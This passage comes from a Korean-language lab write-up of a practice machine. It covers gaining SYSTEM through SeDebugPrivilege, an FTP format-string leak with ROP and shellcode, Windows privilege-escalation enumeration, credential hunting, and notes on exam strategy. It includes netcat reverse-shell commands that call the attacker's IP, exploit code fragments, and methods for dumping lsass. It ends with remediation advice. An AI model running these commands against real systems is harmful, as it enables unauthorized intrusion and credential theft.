> `.\PoC.exe "nc64_new.exe IP PORT -e cmd.exe"` — 따옴표를 빼면 PoC가 `nc64_new.exe`만 명령으로 받고 나머지를 **자기 인자로 오해**한다.
> 그리고 **절대 경로를 써라.** 새 프로세스는 winlogon의 자식이므로 **작업 디렉터리가 우리 셸과 다를 수 있다.**

### 4-5. SYSTEM 획득

```bash
┌──(kali㉿kali)-[~/PG/Osaka]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.243.20] 50087
Microsoft Windows [Version 10.0.17763.4252]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Wilson\Desktop>whoami
whoami
nt authority\system

C:\Users\Wilson\Desktop>type c:\users\administrator\desktop\proof.txt
type c:\users\administrator\desktop\proof.txt
d75fcc9d6d14a696241176dda9889aa1

C:\Users\Wilson\Desktop>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 192.168.243.20
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.243.254
```

> [!note] `rlwrap`과 Windows 셸 — TTY 개념이 없다
> Linux에서 하던 `python3 -c 'import pty; pty.spawn("/bin/bash")'`는 **Windows에 해당 개념이 없다.** cmd.exe는 pty가 아니라 콘솔 API로 동작한다.
> 그래서 `nc`로 받은 Windows 셸에서는:
> - **탭 자동완성 없음**, **위/아래 화살표 히스토리 없음**, **Ctrl+C를 누르면 셸이 통째로 죽는다**
> - `rlwrap nc -lnvp 4444`가 **최소한 히스토리와 줄 편집**을 되살려준다 (`sudo apt install rlwrap`)
> - **대화형 프로그램(`runas`, 암호 프롬프트, `more`)은 먹통이 된다.** 필요하면 `evil-winrm`(5985)이나 RDP(3389)로 옮겨 타라
> - 명령이 에코되어 두 번 보이는 것(`whoami` / `whoami`)은 정상이다

### 4-6. 대안 경로 — 이 박스에서 쓰지 않은 것

| 경로 | 가능성 | 왜 안 썼나 |
|---|---|---|
| `SeLoadDriverPrivilege` | 있음(Disabled 상태로 존재) | 취약 서명 드라이버 로드 → 커널 익스플로잇. **BSOD 위험**이 크고 절차가 길다 |
| SeDebug로 **lsass 덤프 → 해시 추출 → pass-the-hash** | 있음 | `procdump`/`comsvcs.dll` MiniDump로 lsass 덤프 후 mimikatz. **SYSTEM 직행이 더 짧다.** 다만 **AD 환경이면 이쪽이 훨씬 가치 있다**(횡적 이동용 해시 확보) |
| 서비스 권한 오설정 / AlwaysInstallElevated / 스케줄 작업 | 미확인 | `whoami /priv` 한 줄로 끝나서 열거를 더 하지 않았다 |

> [!tip] Windows 권한상승 열거 순서 — 이 순서를 지키면 빠르다
> ```cmd
> :: 1) 토큰 권한 — 가장 빠른 승부처
> whoami /priv
> whoami /groups                                  :: Backup Operators / Server Operators 확인
>
> :: 2) AlwaysInstallElevated (레지스트리 두 곳 모두 1이어야 성립)
> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
>
> :: 3) 서비스 — 인용부호 없는 경로 / 바이너리 쓰기 권한
> wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\\"
> sc qc <서비스명>
> icacls "C:\Program Files\Vuln\service.exe"       :: (F) 또는 (M)이면 교체 가능
>
> :: 4) 스케줄 작업
> schtasks /query /fo LIST /v | findstr /i "TaskName Run As User"
>
> :: 5) 저장된 자격증명
> cmdkey /list
> reg query HKLM /f password /t REG_SZ /s
> dir /s /b C:\unattend.xml C:\Windows\Panther\Unattend.xml C:\sysprep.inf
>
> :: 6) 패치 수준 (커널 익스플로잇은 최후 수단)
> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix"
> ```
> **1번에서 끝나는 박스가 놀랄 만큼 많다.** 이 박스가 정확히 그 사례다.

---

## 5. 플래그

| | 위치 | 값 | 획득 계정 |
|---|---|---|---|
| `local.txt` | `C:\Users\Wilson\Desktop\local.txt` | `1626da9ca8660f809d1df31fa797af30` | `osaka\Wilson` (FTP 서비스 계정) |
| `proof.txt` | `C:\Users\Administrator\Desktop\proof.txt` | `d75fcc9d6d14a696241176dda9889aa1` | `nt authority\system` |

**둘 다 Windows 표준 위치**(`<사용자>\Desktop`)다. 못 찾으면:

```cmd
where /R C:\ local.txt
where /R C:\ proof.txt
dir /s /b C:\*proof.txt
```

> [!tip] 시험 증거 형식 연습
> Windows에서는 Linux의 `whoami; hostname; ip a; cat proof.txt`를 이렇게 대체한다:
> ```cmd
> whoami & hostname & ipconfig & type C:\Users\Administrator\Desktop\proof.txt
> ```
> `&`는 cmd에서 **무조건 순차 실행**이다(`&&`는 성공 시에만).
> 이 박스의 원문은 `type` → `ipconfig`를 **따로 찍었다.** 시험이었다면 **한 화면 스크린샷** 요건을 만족하지 못해 감점 위험이 있다. **한 줄로 묶는 습관을 지금 들여라.**

---

## 6. 막혔던 지점 / 시행착오

### ① `certutil`이 404 오류 페이지를 파일로 저장했다 — 실제로 당한 함정

```
CertUtil: -URLCache command FAILED: 0x80190194 (-2145844844 HTTP_E_STATUS_NOT_FOUND)
CertUtil: Not found (404).
```

**그런데 바로 다음 `dir`에 `nc64.exe`가 335바이트로 존재한다.**

```
08/17/2026  06:14 PM               335 nc64.exe
```

> [!danger] **다운로드가 "실패"했는데 파일은 생겼다**
> 335바이트는 nc64.exe(수십 KB)일 리 없다. **파이썬 `http.server`의 404 HTML 응답 본문**이다.
> `-split`은 HTTP 상태 코드와 무관하게 **응답 본문을 파일로 쓴다.** 종료 코드는 실패인데 부산물이 남는다.
>
> **이 상태로 진행하면 무슨 일이 벌어지나:** `nc64.exe`를 실행하면 "올바른 Win32 응용 프로그램이 아닙니다" 또는 조용한 실패가 나고, **"방화벽이 막나?" "AV인가?" 하며 엉뚱한 곳을 몇십 분 판다.**
>
> **원인은 칼리 쪽 웹서버 디렉터리에 `nc64.exe`가 없었던 것**이다(경로 착오 또는 이름 불일치) [가정].
>
> **검증 습관 — 전송 후 반드시 크기를 확인하라:**
> ```cmd
> dir nc64.exe
> certutil -hashfile nc64.exe MD5
> ```
> 칼리에서 `md5sum nc64.exe`와 대조한다. **바이트 수가 안 맞으면 실행하지 마라.**
> `dir` 결과를 실제로 눈으로 확인했기 때문에 이 박스에서는 빨리 알아챘다 — **파일 전송 뒤 `dir`은 습관으로 굳혀야 한다.**

**해결:** 원문의 실행 명령이 `nc64.exe`가 아니라 **`nc64_new.exe`** 를 가리킨다.

```
.\SeDebugPrivilegePoC.exe "C:\Users\Wilson\Desktop\nc64_new.exe 192.168.45.207 4444 -e ..."
```

즉 **다른 이름으로 다시 전송해 성공**시킨 것이다(재전송 과정은 원문에 기록되지 않았다). 망가진 335바이트 파일을 덮어쓰려 하지 않고 **새 이름을 쓴 판단이 옳다** — `certutil`의 URL 캐시가 남아 있으면 `-f` 없이 재시도할 때 또 옛것이 나온다.

> [!tip] 일반화 — "실패 메시지가 떴는데 부산물이 남는" 도구들
> `certutil`(404 본문 저장) · `wget`(에러 페이지 저장) · `curl -O`(에러 본문 저장) · `scp`(부분 전송).
> **전송 성공 판정은 종료 코드가 아니라 크기·해시로 하라.**

### ② `ls`를 쳤다 — Linux 반사

```
C:\Users\Wilson\Desktop>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.
```

사소해 보이지만 **경고 신호**다. Linux 반사로 치고 있다는 뜻이고, 같은 반사로 `cat`·`grep`·`which`·`ifconfig`를 치면 계속 헛돈다.

| Linux | cmd.exe | PowerShell |
|---|---|---|
| `ls` | `dir` | `Get-ChildItem` (`ls` 별칭 있음) |
| `cat` | `type` | `Get-Content` |
| `grep` | `findstr` | `Select-String` |
| `which` | `where` | `Get-Command` |
| `ifconfig` | `ipconfig` | `Get-NetIPAddress` |
| `ps` | `tasklist` | `Get-Process` |
| `find / -name x` | `where /R C:\ x` | `Get-ChildItem -Recurse -Filter x` |
| `wget` | `certutil -urlcache -split -f` | `iwr -Uri ... -OutFile ...` |

> [!tip] cmd 셸을 잡았으면 즉시 PowerShell로 갈아탈지 판단하라
> `powershell -nop -ep bypass` 한 줄이면 위 오른쪽 칼럼을 전부 쓸 수 있다.
> 단 **PowerShell은 AMSI·스크립트 블록 로깅에 훨씬 잘 잡힌다.** 탐지를 신경 쓰는 상황이면 cmd가 조용하다.

### ③ 릭 인덱스를 잘못 잡으면 베이스가 쓰레기가 된다

`leak[0]`이 아니라 `leak[5]`(=`0x55424544`)를 골랐다면 베이스는 `0x55423454`가 되고, **모든 ROP 가젯 주소가 매핑되지 않은 메모리**를 가리켜 즉시 액세스 위반이다.

증상이 고약한 이유: **"오프셋이 틀렸나" "배드캐릭터인가" "가젯이 잘못됐나"를 먼저 의심**하게 되어 진짜 원인(릭 인덱스)에 도달하기까지 오래 걸린다.

> [!danger] 릭 값 검증 체크리스트 — 익스플로잇을 짜기 전에 통과시켜라
> 1. **하위 16비트가 0인가?** PE는 **64KB 할당 단위** 경계에 매핑되므로 계산된 베이스는 `0x____0000` 형태여야 한다 → `0x012d0000` ✓ (4KB가 아니다 — 2-5절)
> 2. **값이 ASCII로 보이지 않는가?** 각 바이트가 0x20~0x7E에 몰려 있으면 문자열이다
> 3. **여러 번 실행해도 계산된 베이스가 "그럴듯한 범위"인가?** ASLR로 매번 달라지되 32비트 사용자 공간(`0x00010000`~`0x7FFEFFFF`) 안이어야 한다
> 4. **오프셋 상수(여기선 `0x10f0`)가 매 실행 일정한가?** 일정하지 않다면 인덱스를 잘못 잡은 것이다

### ④ `recvlines(numlines=2)[-1]` — 여기서 한 번은 반드시 걸린다

`recvuntil(b"230 Login successful")`은 **뒤따르는 `\r\n`을 버퍼에 남긴다.** 그래서 다음 `recvlines`의 **첫 줄은 그 잔여 개행**이고 진짜 응답은 두 번째다.

`numlines=1`로 짰다면 `leak`는 빈 바이트열이 되고 `int(b'', 16)` → **`ValueError`** 로 죽는다.

> [!tip] pwntools 줄 파싱 사고를 원천 차단하는 법
> ```python
> p.recvuntil(b"230 Login successful\r\n")   # ← 종결자까지 명시적으로 소비
> p.sendline(b"DEBUG " + b"%x|" * 100)
> leak = p.recvline().strip()[6:]            # 그러면 recvline() 한 번이면 된다
> ```
> **`recvuntil`의 인자에 개행까지 포함시키는 습관**이 인덱스 계산을 통째로 없앤다.
> 디버깅용으로는 `remote(..., level='debug')`가 이 스크립트처럼 **송수신 전량을 찍어주므로**, 파싱이 이상하면 먼저 그 로그에서 실제 바이트를 확인하라.

### ⑤ `\x90 * 16` 주석 `# real NOP sled`

`real`이라는 단어는 **그 전에 "가짜"가 있었다**는 뜻이다 [가정]. 흔한 경로는 두 가지다:

- NOP 자리를 `b"A"`나 `b"\x41"`로 채웠다 → `inc ecx`로 실행되긴 하지만 의도한 정렬이 아니고, 길이/레지스터 상태에 따라 깨진다
- NOP 슬레드를 **아예 넣지 않았다** → 착지점이 셸코드 첫 바이트와 어긋나면 **셸코드 중간부터 실행**되어 즉사한다(다만 이 체인에서는 어긋나지 않는다 — 아래)

> [!warning] 이 체인에서 착지점은 **결정론적이다** — NOP 16바이트는 관례적 여유였다 [가정]
> 일반론으로는 `JMP ESP` 시점의 ESP가 스택 정렬·호출 규약·컴파일러에 따라 몇 바이트 흔들릴 수 있고, 16~32바이트 NOP이 그 오차를 삼킨다. **그러나 이 익스플로잇에는 흔들릴 여지가 없다.**
> `VirtualAlloc`은 stdcall이라 **인자 4개(16바이트)를 스스로 정리**하고 반환 → `POP EBP`가 남은 EAX 슬롯 **4바이트를 삼킴** → `RETN`이 `JMP ESP`로 → **이 시점 ESP는 NOP의 첫 바이트**다(2-8절 실행 흐름 4~6단계).
> 헥사덤프가 정확히 그렇게 배치돼 있다 — 패킷 `0x151`~`0x154`가 마지막 가젯 `JMP ESP`(`da 10 2d 01`), **`0x155`부터 `\x90` 16개, `0x165`부터 셸코드**(`fc e8 82 ...`).
> 즉 **NOP이 없었어도 동작했을 가능성이 높다.** 그렇다고 빼지는 마라 — 계산이 한 칸만 어긋나도 즉사하는 비용에 비해 16바이트는 공짜다.
> 총 길이가 고정(1000)이므로 NOP을 늘리면 `C` 패딩을 줄여야 한다 — 그래서 `assert` 메시지가 `(NOP 개수로 조절)`이다.

### ⑥ 배드캐릭터를 확인하지 않았다 — 그런데도 통했다. 그 이유가 진짜 교훈이다

`No encoder specified, outputting raw payload`. 통념대로라면 FTP 같은 **줄 기반 텍스트 프로토콜**에서 `\x00\x0a\x0d`는 거의 확실히 문제가 된다. **이 박스에서는 문제가 되지 않았다.**

셸코드 324바이트에 **`\x00` 12개 · `\x0d` 2개 · `\x0a` 1개**가 들어 있고(3-3절 헥사덤프의 `fc e8 82 00 00 00` · `c1 cf 0d 01` · `7c 0a 80 fb` · `68 63 6d 64 00`), ROP 체인의 `0x1`·`0x1000`·`0x40`도 널을 세 개씩 끌고 들어간다. 그 전부가 온전히 전달돼 셸이 떨어졌다.

**따라서 이 노트가 남길 교훈은 "운이 좋았다"가 아니라 "이 취약점은 배드캐릭터가 없는 유형이었다"다.** 널 12개가 통과했다는 것은 파서가 **문자열이 아니라 고정 길이 버퍼를 읽는다**(길이 기반 `recv`/`memcpy`)는 강한 증거다 — 2-1절의 의사코드를 그 근거로 고쳤다.

**그래도 절차는 유지한다.** 파서가 문자열 기반인지 길이 기반인지는 **덤프를 보고 나서야** 알 수 있고, 사전에는 알 수 없다. `-b '\x00\x0a\x0d'`는 넣어서 손해 볼 것이 없다.

**증상이 최악인 이유(문자열 기반 파서였을 경우):** 셸코드가 **중간에서 잘리면** 앞부분(소켓 생성까지)은 정상 실행되어 **리스너에 연결이 잡혔다가 즉시 끊긴다.** "붙었다 끊긴다"를 방화벽 문제로 오해하기 딱 좋다.

**셸코드가 붙었다 끊기면 배드캐릭터를 먼저 의심하라. 반대로 배드캐릭터를 지웠는데도 안 되면, 원인은 다른 데 있다.**

### ⑦ 이 유형에서 흔히 막히는 지점 — `DEBUG`를 애초에 못 찾는 경우

> [!note] 원문 터미널에는 안 나오지만, **실제로 밟은 경로는 Kali 작업 디렉터리에 남아 있다**
> `~/PG/Osaka/`의 파일 타임스탬프가 순서를 그대로 보존한다 — `nmap.log 08:54` → `dev.txt 09:03` → **`ftp.exe 09:04`** → `shellcode.txt 09:47` → `exploit.py 09:48`.
> 즉 스캔 10분 뒤에 **타겟 바이너리를 내려받아 분석**했고, 그로부터 43분 뒤에 셸코드와 익스플로잇이 나왔다. 아래 "찾는 방법 셋" 중 **③(바이너리 확보 후 `strings`)이 실제 경로**다.
> 그래도 ①②는 함께 익혀둬라 — **바이너리를 못 내려받는 상황이 더 흔하다.**
> (그리고 그렇게 받은 `ftp.exe`는 **ASCII 모드 전송으로 깨져 있었다** — ⑪)

포맷 스트링 릭이 없으면 ASLR 때문에 **ROP 체인의 모든 주소가 무의미**해진다. 즉 `DEBUG`를 못 찾으면 이 박스는 풀 수 없다. 그런데 `DEBUG`는 **RFC 959 어디에도 없는 명령**이라 FTP 지식만으로는 절대 떠오르지 않는다.

**찾는 방법은 셋뿐이다:**

```bash
# ① HELP — 구현된 명령을 서버가 스스로 알려주는 경우
printf 'USER admin\r\nPASS admin\r\nHELP\r\n' | nc -nv 192.168.243.20 21

# ② 후보 단어 무차별 — 표준 FTP 명령 + 진단용 관용어
for c in DEBUG TEST DEV ADMIN TRACE VERBOSE ECHO STAT SITE STAT; do
  printf "USER admin\r\nPASS admin\r\n$c x\r\nQUIT\r\n" | nc -nw2 192.168.243.20 21 | tail -1
done
# → "500 Unknown command" 가 아닌 응답이 오는 것이 존재하는 명령이다

# ③ 바이너리 확보 후 문자열 추출 — 가장 확실하다. ★ 이 박스에서 실제로 쓴 경로
#    FTP 서비스 자신이 RETR을 제공하므로 서버 바이너리를 그대로 내려받을 수 있었다
#    ※ 반드시 binary 모드로 받아라 — ascii 모드로 받으면 조용히 깨진다 (⑪)
strings -n 4 SimpleFTP.exe | grep -iE '^[A-Z]{3,8}$'
```

> [!danger] **응답 코드의 차이가 명령 존재 여부를 알려준다**
> `500 Unknown command`(없음) vs `501 Syntax error`(있지만 인자가 틀림) vs `530 Not logged in`(있지만 인증 필요).
> **"에러가 났다 = 그 명령은 없다"가 아니다.** 에러 코드를 구분하지 않으면 존재하는 명령을 스스로 지워버린다.
> 같은 계열 함정: [[Hawat]]의 "응답이 성공을 뜻하지 않는다".

**막히면 다음 후보 경로:** ①로 명령이 안 나오고 ②③도 실패하면 — 릭 없이 가능한 경로를 찾는다. `!mona modules`로 **비-ASLR 모듈**을 찾거나(2-11), 그것도 없으면 **21번을 접고 445/3389/5985로 이동**한다.

### ⑧ 32비트인지 64비트인지 확정하지 않고 셸코드를 만들면 즉사한다

이 박스는 `-a x86`이 정답이었다. 근거는 **릭 값이 4바이트 폭**(`0x012d10f0`)이고 **ROP 가젯을 `p32()`로 팩**했다는 것이다.

**잘못 고르면 증상이 지독하다:** 오프셋도 맞고 EIP도 잡히는데 **셸코드 진입 즉시 액세스 위반**이 난다. "배드캐릭터인가" "DEP인가"를 의심하며 한참을 판다.

| 확인 방법 | 32비트 신호 | 64비트 신호 |
|---|---|---|
| 릭 값 자릿수 | 최대 8자리 (`0x012d10f0`) | 12자리 이상 (`0x7ff6a1b20000`) |
| 크래시 시 레지스터 | `EIP`/`ESP` | `RIP`/`RSP` |
| 타겟 파일 경로 | `C:\Program Files (x86)\` | `C:\Program Files\` |
| `tasklist`(셸 확보 후) | — | 32비트 프로세스는 `*32` 표기 |

> [!warning] **64비트 Windows에서도 서비스는 32비트로 도는 경우가 많다**
> OS가 Server 2019 x64라고 해서 페이로드가 x64인 것이 아니다. **판정 기준은 OS가 아니라 그 프로세스**다.
> 이 박스가 정확히 그 경우다 — OS는 10.0.17763 x64, 취약 서비스는 x86.

### ⑨ 원샷 익스플로잇 — 실패하면 서비스가 죽는다

스택을 파괴하는 익스플로잇은 **실패 시 프로세스를 크래시시킨다.** 서비스가 자동 재시작되지 않으면 **21번 포트가 사라지고, 그때부터는 리버트 말고는 방법이 없다.**

원문 스크립트의 `input()` 일시정지가 이 문제에 대한 실질적 방어다:

```python
print("Press any key to send")
input()          # ← 이 사이에 리스너를 확인한다
```

> [!danger] 오버플로우를 던지기 **직전** 체크리스트 — 한 번 죽으면 되돌릴 수 없다
> 1. **리스너가 떠 있는가** — `ss -tlnp | grep 443` 로 눈으로 확인. 마음속으로 "띄웠지"는 안 된다
> 2. **셸코드의 LHOST가 지금 VPN IP와 같은가** — `ip a show tun0`. **VPN 재접속으로 IP가 바뀌는 것이 가장 흔한 사고**다
> 3. **포트가 리스너와 셸코드에서 일치하는가** — 셸코드는 443, 리스너는 4444로 띄우는 실수
> 4. **`assert`가 통과하는가** — 길이 검증
> 5. **베이스가 `0x____0000`인가** — 릭 검증(6장 ③)
>
> **5개를 통과하지 못한 채 던지는 것보다, 30초 더 확인하고 던지는 것이 압도적으로 싸다.**

### ⑩ 시간 배분 — 어디서 손절했어야 하는가

| 단계 | 판단 기준 | 손절선 |
|---|---|---|
| 21번 정체 파악 (`HELP`로 명령 열거) | 비표준 명령이 나오는가 | **15분.** 안 나오면 445/3389/5985로 이동 |
| 오프셋·EIP 제어 확인 | `EIP = 0x42424242`가 나오는가 | **45분.** 여기까지 못 가면 이 경로 자체가 틀렸을 가능성 |
| 릭 + ROP 조립 | 베이스가 `0x____0000`으로 나오는가 | **60분.** 이 박스가 가장 오래 걸리는 구간 |
| 셸코드 실행 실패 디버깅 | 붙었다 끊기는가 / 아예 안 붙는가 | **30분.** 끊기면 배드캐릭터, 안 붙으면 포트(443/80/53) |
| 권한상승 | `whoami /priv` | **5분.** 여기서 답이 안 보이면 서비스·레지스트리 열거로 넘어간다 |

> [!danger] 바이너리 익스플로잇은 **시험에서 가장 위험한 시간 함정**이다
> 웹 취약점은 진행 여부가 응답으로 즉시 드러나지만, 오버플로우는 **"크래시는 나는데 셸이 안 붙는" 상태로 몇 시간이 증발**한다.
> **규칙: 90분 안에 EIP 제어(`0x42424242`)를 못 만들면 다른 머신으로 갈아타고 나중에 돌아와라.**
> 반대로 **EIP 제어에 성공했다면 끝까지 밀어붙일 가치가 있다** — 남은 것은 기계적인 절차다.

### ⑪ FTP `ascii` 모드로 서버 바이너리를 받아 파일이 깨졌다 — 실제로 당했다

⑦에서 확인했듯 `DEBUG`는 **타겟 바이너리를 내려받아 찾았다.** 그런데 Kali에 남은 `~/PG/Osaka/ftp.exe`는 **55,971바이트**인 반면, **그 파일의 PE 헤더가 요구하는 크기는 약 158,208바이트**다. 전송이 중간에 끊긴 것이 아니라 **받는 도중에 바이트가 군데군데 소실됐다.**

결정적 증거는 DOS 스텁이다. 정상 PE라면 `\r\r\n`이 있어야 할 자리에서 **`\r` 하나가 사라져** 이후 전체가 앞으로 밀렸고, 그래서 **`PE\0\0` 시그니처가 `0x100`이 아니라 `0xff`에 있다.** 소실은 누적된다 — `0x4d5`에서 1바이트, `0x11fd`에서 2바이트, `0x3a5e`에서 9바이트, `0xd537`에서 14바이트.

**원인: FTP 클라이언트의 기본 전송 모드가 `ascii`다.** ASCII 모드는 줄바꿈을 플랫폼 규약에 맞게 **변환**하므로, 바이너리 안의 `0x0d`/`0x0a`가 데이터가 아니라 개행으로 처리되어 사라진다.

> [!danger] 바이너리는 **반드시 `binary` 모드로 받아라**
> ```bash
> ftp 192.168.243.20
> ftp> binary            # ← 이 한 줄. 별칭 bin / type image
> ftp> get ftp.exe
> ftp> bye
> ls -l ftp.exe          # 크기를 눈으로 확인. 서버가 알려준 크기와 대조
> ```
> **증상이 고약한 이유:** 파일은 생기고 `file`은 여전히 `PE32 executable`이라고 답한다. IDA/Ghidra에 올려서 **디스어셈블이 이상하거나 섹션 오프셋이 안 맞을 때**에야 알아챈다. 그때는 이미 "이 바이너리가 난독화됐나"를 의심하며 시간을 태운 뒤다.
> **이 박스에서 결과적으로 넘어간 이유:** 목적이 `strings`로 `DEBUG`를 뽑는 것뿐이었고, **문자열은 소실 지점 뒤에서도 대체로 살아남는다** [가정]. 하지만 **디버거로 가젯 오프셋을 재려 했다면 전부 어긋났을 것이다** — ROP 주소 `0xe145`·`0x1d5a9` 등은 결국 다른 경로로 확보한 셈이다.
> **같은 계열: ① `certutil`의 404-그러나-파일-생성.** 두 사고를 한 규칙이 막는다 — **전송 성공 판정은 종료 코드가 아니라 크기·해시로 한다.**

---

## 7. OSCP 시험 관점

1. **nmap이 버전을 못 붙인 포트가 그날의 정답이다.** `fingerprint-strings` 블록과 `service unrecognized` 메시지를 신호로 읽어라. `searchsploit`이 아니라 **`nc`로 붙어 `HELP`를 쳐 명령 목록을 뽑는 것**이 첫 수다.

2. **`-p-` 전수 스캔은 타협하지 마라.** 이 박스는 21번이 정답인데, 기본 스캔으로도 잡히긴 하지만 **49664+ 동적 포트와 47001** 같은 맥락은 전수 스캔에서만 보인다.

3. **⚠️ 시험 도구 규정 — 이 박스에 적용되는 것**
   | 도구 | 시험 가부 | 근거 / 수동 대안 |
   |---|---|---|
   | **`msfvenom`** | **허용** | 페이로드 생성기이지 자동 익스플로잇이 아니다. 이 박스의 사용법이 그대로 유효 |
   | **`msf-pattern_create` / `msf-pattern_offset`** | **허용** | 오프셋 계산 유틸리티. 수동 대안: 파이썬으로 `Aa0Aa1...` 패턴을 직접 생성 |
   | **`pwntools`** | **허용** | 소켓 라이브러리. 수동 대안은 아래 4번 |
   | **`mona.py`** (Immunity) | **허용** | 디버거 플러그인. **다만 생성된 ROP 체인의 주석을 검증하라**(2-8 참조) |
   | **`metasploit` 모듈 / `meterpreter`** | **1대 한정** | 이 박스처럼 커스텀 서비스면 어차피 모듈이 없다. **`windows/shell_reverse_tcp`(순수 cmd)를 고른 것이 정답** |
   | **`multi/handler`** | 위 1대 제한에 포함 | **대안: `nc -lvnp 443`** — 이 박스가 쓴 방식 그대로 |

4. **⚠️ `pwntools` 없이 같은 익스플로잇을 쓰는 법** — 표준 라이브러리만으로 충분하다:
   ```python
   import socket, struct
   def p32(x): return struct.pack('<I', x)

   s = socket.create_connection(('192.168.243.20', 21)); f = s.makefile('rwb')
   def rd(): return f.readline()
   def wr(d): f.write(d + b'\r\n'); f.flush()

   rd()                                  # 220 배너
   wr(b'USER admin'); rd()
   wr(b'PASS admin'); rd()
   wr(b'DEBUG ' + b'%x|' * 100)
   line = rd().strip()
   if not line.startswith(b'DEBUG'): line = rd().strip()   # ← 잔여 개행 방어
   base = int(line[6:].split(b'|')[0], 16) - 0x10f0
   print(hex(base))
   # ... rop / buf 조립은 동일 ...
   wr(b'RETR ' + buf)
   ```
   **`if not line.startswith(...)` 한 줄이 6장 ④의 사고를 구조적으로 막는다.**

5. **셸코드는 붙이기 전에 눈으로 검증한다.** LHOST는 `\x68` 뒤 4바이트, LPORT는 `\x02\x00` 뒤 2바이트, `\x68\x63\x6d\x64\x00`이 있으면 순수 cmd 셸이다. **오타 하나로 몇 시간이 날아가는 지점**이 여기다.

6. **`-b '\x00\x0a\x0d'`를 기본으로 붙이되, "텍스트 프로토콜이니 당연히 배드캐릭터"라고 단정하지는 마라.** 이 박스는 셸코드에 `\x00`이 **12개** 들어 있는데도 그대로 통했다(6장 ⑥). **배드캐릭터의 유무는 프로토콜이 아니라 파서 구현이 정한다** — 길이 기반 복사면 널도 통과한다. `-b`는 넣어도 손해가 없으니 습관으로 붙이되, 실패했을 때 배드캐릭터로 단정하고 진짜 원인을 놓치지 마라. **"붙었다 끊기면 배드캐릭터, 아예 안 붙으면 포트."**

7. **리버스셸 포트는 443/80/53을 먼저 쓴다.** 이 박스는 1단계 443, 2단계 4444를 썼고 둘 다 통했다(랩 환경은 아웃바운드가 열려 있다). **시험/실전에서 4444가 막히면 즉시 443으로 갈아타라.** 443 리스너는 1024 미만이라 **`sudo` 필요**.

8. **Windows 셸을 잡으면 `whoami /priv`가 첫 수다.** Linux의 `sudo -l`과 같은 위상이다. 이 박스는 이 한 줄로 권한상승이 끝났다.

9. **`State: Disabled`를 "사용 불가"로 읽지 마라.** 목록에 있으면 활성화 가능하다. **진짜 없는 권한은 행이 아예 없다.** `SeImpersonatePrivilege`의 부재를 확인하고 Potato 계열을 배제한 것이 이 박스에서 시간을 아꼈다.

10. **위험한 권한 5종 반사표:**
    | 권한 | 공격 |
    |---|---|
    | `SeImpersonate` / `SeAssignPrimaryToken` | **PrintSpoofer · RoguePotato · GodPotato** (서비스 계정에서 가장 흔함) |
    | **`SeDebug`** | **SYSTEM 프로세스 핸들 탈취 → 자식 프로세스 생성**(이 박스) 또는 **lsass 덤프** |
    | `SeBackup` / `SeRestore` | `reg save hklm\sam` + `hklm\system` → 로컬 해시 추출 → PtH |
    | `SeLoadDriver` | 취약 서명 드라이버 로드 → 커널 코드 실행 (**BSOD 위험**) |
    | `SeTakeOwnership` | 임의 파일 소유권 획득 → SYSTEM 실행 바이너리 교체 |

11. **Windows 파일 전송 3종을 외워라.** `certutil -urlcache -split -f <url>` · `powershell iwr -Uri <url> -OutFile <path>` · SMB(`impacket-smbserver share . -smb2support` 후 `copy \\IP\share\x.exe .`). **전송 후 `dir`로 크기 확인은 선택이 아니라 필수다**(6장 ①).

12. **Windows 셸에는 TTY 개념이 없다.** `pty.spawn` 대신 `rlwrap`으로 줄 편집만 확보하고, 대화형이 필요하면 **`evil-winrm`(5985)이나 RDP(3389)** 로 이동한다. 이 박스는 두 포트가 다 열려 있었다.

13. **증거는 한 화면에 묶어라.** `whoami & hostname & ipconfig & type ...\proof.txt`. 이 박스의 원문처럼 따로 찍으면 시험에서 재촬영해야 한다.

14. **바이너리 익스플로잇 손절선: EIP 제어까지 90분.** 못 넘기면 다른 머신으로 갔다가 돌아와라. 넘겼으면 남은 건 기계적 절차이니 끝까지 민다.

---

## 8. 방어 관점

| 결함 | 근거 | 조치 |
|---|---|---|
| **포맷 스트링** — 사용자 입력이 포맷 문자열 위치에 사용 | `DEBUG %x|...`가 스택 값으로 치환되어 반환 | `printf(user)` → **`printf("%s", user)`**. 컴파일 시 `-Wformat -Wformat-security -Werror=format-security`로 강제 검출 |
| **스택 버퍼 오버플로우** — 길이 검사 없는 복사 | `RETR` 인자 272바이트 뒤가 EIP | `strcpy`/`sprintf`/`strcat` 전면 금지 → `strncpy_s`/`snprintf`. **입력 길이를 파서 진입점에서 먼저 검증** |
| **디버그 명령이 운영 빌드에 남음** | 표준 FTP에 없는 `DEBUG` 명령 | 진단 기능은 **빌드 플래그로 제거**하거나 **로컬 인터페이스에만 바인딩**. 프로토콜에 없는 명령은 `500 Unknown command`로 거절 |
| **`/GS`(스택 쿠키)·`/guard:cf`(CFG) 미적용** — `/DYNAMICBASE`·`/NXCOMPAT`는 **이미 켜져 있었다** | PE OptionalHeader 실측: `DllCharacteristics = 0x8140` → **`DYNAMIC_BASE`(0x40)·`NX_COMPAT`(0x100) 설정됨**, **`GUARD_CF`(0x4000) 없음**. `IMAGE_FILE_RELOCS_STRIPPED = False`(재배치 가능), `ImageBase 0x00400000`, Machine `0x014c`(i386) | **ASLR·DEP가 켜진 상태에서 뚫린 사례다** — 그래서 2-7절처럼 포맷 스트링 릭(ASLR 우회)과 `VirtualAlloc` ROP(DEP 우회)가 **둘 다 필요했다.** 빠진 것은 **`/GS`**(쿠키가 있었다면 반환 주소 덮어쓰기가 `__report_gsfailure`로 잡힌다)와 **`/guard:cf`**(CFG였다면 `JMP [EAX]` 간접 호출 단계에서 차단됐다 — CFG 미설정은 위 플래그로 **실측 확인**). 두 스위치를 켜라 |
| **기본 자격증명 `admin:admin`** | `230 Login successful` | 설치 시 강제 변경, 계정 잠금 정책, 실패 로그 |
